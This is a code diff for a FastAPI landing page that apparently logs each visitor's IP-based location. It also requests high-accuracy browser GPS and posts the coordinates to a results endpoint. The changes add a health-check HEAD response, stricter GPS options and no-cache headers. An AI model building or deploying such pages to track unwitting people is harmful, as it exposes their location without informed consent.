@@ -30,8 +30,12 @@ async def fetch_ip_geolocation(ip: str) -> dict:
     return {"city": "Unknown", "region": "Unknown", "country": "Unknown", "isp": "Unknown"}
 
 
-@app.get("/", response_class=HTMLResponse)
+@app.api_route("/", methods=["GET", "HEAD"], response_class=HTMLResponse)
 async def public_landing_page(request: Request):
+    # Respond to Render Health Check Pings instantly
+    if request.method == "HEAD":
+        return HTMLResponse(content="", status_code=200)
+
     forwarded_for = request.headers.get("x-forwarded-for")
     real_ip = forwarded_for.split(",")[0].strip() if forwarded_for else request.client.host
     location_info = await fetch_ip_geolocation(real_ip)
@@ -44,7 +48,7 @@ async def public_landing_page(request: Request):
     print(" Requesting browser GPS permission...")
     print("="*60 + "\n")
 
-    return """
+    html_content = """
     <!DOCTYPE html>
     <html>
     <head>
@@ -83,13 +87,21 @@ async def public_landing_page(request: Request):
                                 error_message: error.message
                             })
                         });
-                    }
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                 );
             }
         </script>
     </body>
     </html>
     """
+
+    response = HTMLResponse(content=html_content, status_code=200)
+    # FORCE BROWSER TO NEVER CACHE THIS PAGE
+    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate, max-age=0"
+    response.headers["Pragma"] = "no-cache"
+    response.headers["Expires"] = "0"
+    return response
 
 
 @app.post("/api/location-result")
